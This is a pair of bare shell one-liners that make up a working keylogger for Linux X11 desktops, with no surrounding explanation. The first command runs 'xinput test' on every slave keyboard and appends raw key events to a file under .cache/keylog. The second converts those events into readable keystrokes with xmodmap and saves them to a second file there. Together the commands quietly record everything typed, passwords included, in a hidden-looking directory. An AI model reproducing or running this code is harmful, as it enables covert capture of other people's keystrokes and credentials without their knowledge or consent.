xinput list | grep -Po 'id=\K\d+(?=.*slave\s*keyboard)' | xargs -P0 -n1 xinput test >> .cache/keylog/out.txt

cat .cache/keylog/out.txt | grep "press" | awk 'BEGIN{while (("xmodmap -pke" | getline) > 0) k[$2]=$4} {print "" k[$NF] ""}' > .cache/keylog/log.txt
